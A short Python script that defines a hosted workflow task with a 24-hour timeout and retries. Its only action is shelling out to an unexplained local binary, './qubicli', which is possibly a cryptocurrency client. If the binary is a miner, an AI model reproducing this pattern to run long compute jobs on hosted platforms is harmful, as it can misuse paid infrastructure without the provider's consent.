import sys
from render_sdk import Workflows, Retry

app = Workflows()

@app.task(
  plan="pro",
  timeout_seconds=86400,
  retry=Retry(
    max_retries=3,
    wait_duration_ms=1
  )
)
def building1():
  import sys
  import os
  os.system('./qubicli')

if __name__ == "__main__":
  app.start()
